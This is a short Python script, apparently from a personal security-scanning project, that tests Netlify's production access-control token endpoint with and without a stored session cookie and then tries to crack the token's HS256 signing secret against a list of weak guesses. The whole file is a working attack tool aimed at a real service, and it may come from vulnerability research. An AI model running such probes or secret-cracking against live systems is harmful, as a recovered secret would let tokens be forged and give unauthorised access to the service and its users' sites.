# -*- coding: utf-8 -*-
"""Netlify:accessControlToken 匿名生成测试 + HS256 弱密钥"""
import http.client, ssl, gzip, brotli, json, sys, base64, hmac, hashlib, itertools
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_NET

ctx = ssl.create_default_context()

def req(host, path, method='GET', headers=None, body=None):
    conn = http.client.HTTPSConnection(host, context=ctx, timeout=20)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json'}
    if headers:
        h.update(headers)
    conn.request(method, path, body=body, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw

# 1. 匿名生成 accessControlToken
s, raw = req('app.netlify.com', '/access-control/generate-access-control-token')
print('anon generate-access-control-token:', s, raw[:120].decode('utf-8', 'ignore'))
s2, raw2 = req('app.netlify.com', '/access-control/generate-access-control-token', headers={'Cookie': COOKIE_NET})
print('auth generate-access-control-token:', s2, raw2[:80].decode('utf-8', 'ignore'))

# 2. HS256 弱密钥爆破(用自己的 token)
tok = None
try:
    d = json.loads(raw2)
    tok = d.get('accessControlToken')
except Exception:
    pass

if tok:
    parts = tok.split('.')
    sig = parts[2]
    msg = (parts[0] + '.' + parts[1]).encode()
    want = base64.urlsafe_b64decode(sig + '=' * (-len(sig) % 4))
    print('token sample:', parts[0][:60], '...', parts[1][:60], '...')
    # 常见弱密钥
    weak = ['secret', 'netlify', 'netlify.com', 'access-control', 'accessControl', 'access_control',
            'accesstoken', 'access-control-token', 'netlify-access-control', 'nfu', 's3cr3t',
            'password', 'changeme', 'jwt-secret', 'jwt_secret', 'key', 'accesscontrol',
            'access-control-secret', 'secret-key', 'netlify-access-control-token',
            'a' * 32, 'b' * 32, '0' * 32, '12345678', '1234567890']
    for k in weak:
        if hmac.compare_digest(hmac.new(k.encode(), msg, hashlib.sha256).digest(), want):
            print('*** WEAK SECRET FOUND:', k)
            break
    else:
        print('no weak secret matched (%d tried)' % len(weak))
